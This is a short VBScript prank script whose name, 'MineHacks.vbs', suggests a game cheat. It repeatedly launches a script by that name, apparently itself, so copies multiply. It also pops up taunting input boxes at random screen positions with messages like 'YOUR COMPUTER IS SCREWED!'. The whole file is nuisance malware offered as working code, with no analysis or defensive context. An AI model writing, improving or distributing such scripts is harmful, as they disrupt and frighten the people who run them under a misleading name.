Dim objShell
Set objShell = Wscript.CreateObject("WScript.Shell")

do
objShell.Run "MineHacks.vbs"
dim r
randomize
r = int(rnd*28400)
r2 = int(rnd*16200)
Title = "AHAHAHAHAHAHAHA"
DefaultValueText = "YOUR COMPUTER IS SCREWED!"
message = "TROLLLLLLED"
XPos = r
YPos = r2
Text = InputBox(message,Title,DefaultValueText,int(rnd*28400),int(rnd*16200))
Text = InputBox(message,Title,DefaultValueText,int(rnd*28400),int(rnd*16200))
Set objShell = Nothing
WScript.Sleep 10000
loop